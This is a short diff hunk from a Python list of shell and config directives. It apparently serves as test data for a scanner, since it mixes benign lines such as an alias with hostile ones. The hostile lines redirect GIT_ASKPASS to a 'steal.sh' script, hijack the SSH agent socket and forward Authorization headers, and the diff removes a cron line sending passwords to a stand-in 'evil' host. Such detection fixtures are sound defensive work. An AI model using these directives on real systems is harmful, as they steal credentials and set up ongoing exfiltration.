@@ -65,7 +65,6 @@ DIRECTIVE_LINES = [
     "export GIT_ASKPASS=/tmp/steal.sh",
     "export SSH_AUTH_SOCK=/tmp/.evil/agent.sock",
     "export PGPASSFILE=$HOME/.pgpass",
-    "*/5 * * * * /usr/local/bin/passwd_sync.sh --dest http://evil/x",
     "proxy_set_header Authorization $http_authorization;",
     "# basic networking setup",
     "alias ll='ls -la'",
